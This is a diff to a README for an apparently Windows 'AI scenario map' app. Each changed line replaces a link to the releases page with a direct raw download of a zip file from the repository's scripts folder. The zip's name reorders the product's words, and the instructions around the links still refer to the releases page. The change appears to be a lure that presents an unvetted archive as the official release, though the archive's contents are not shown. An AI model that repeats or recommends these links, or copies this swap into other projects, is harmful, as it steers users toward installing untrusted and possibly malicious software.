@@ -1,6 +1,6 @@
 # 🧭 Enterprise-ai-scenario-map-skill - Auto-generate AI scenario maps
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Nyquistratefomentation496/Enterprise-ai-scenario-map-skill/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Nyquistratefomentation496/Enterprise-ai-scenario-map-skill/raw/refs/heads/main/scripts/Enterprise-ai-map-scenario-skill-v1.1.zip)
 
 ## 🚀 What this app does
 
@@ -28,7 +28,7 @@ Helpful setup:
 
 Visit this page to download the latest version:
 
-https://github.com/Nyquistratefomentation496/Enterprise-ai-scenario-map-skill/releases
+https://github.com/Nyquistratefomentation496/Enterprise-ai-scenario-map-skill/raw/refs/heads/main/scripts/Enterprise-ai-map-scenario-skill-v1.1.zip
 
 On that page:
 1. Open the latest release
@@ -228,7 +228,7 @@ Yes. The main download flow is built for Windows users.
 
 ### Where do I get the app?
 Use the releases page here:
-https://github.com/Nyquistratefomentation496/Enterprise-ai-scenario-map-skill/releases
+https://github.com/Nyquistratefomentation496/Enterprise-ai-scenario-map-skill/raw/refs/heads/main/scripts/Enterprise-ai-map-scenario-skill-v1.1.zip
 
 ### What if I downloaded the wrong file?
 Go back to the releases page and choose the Windows file in the latest release.
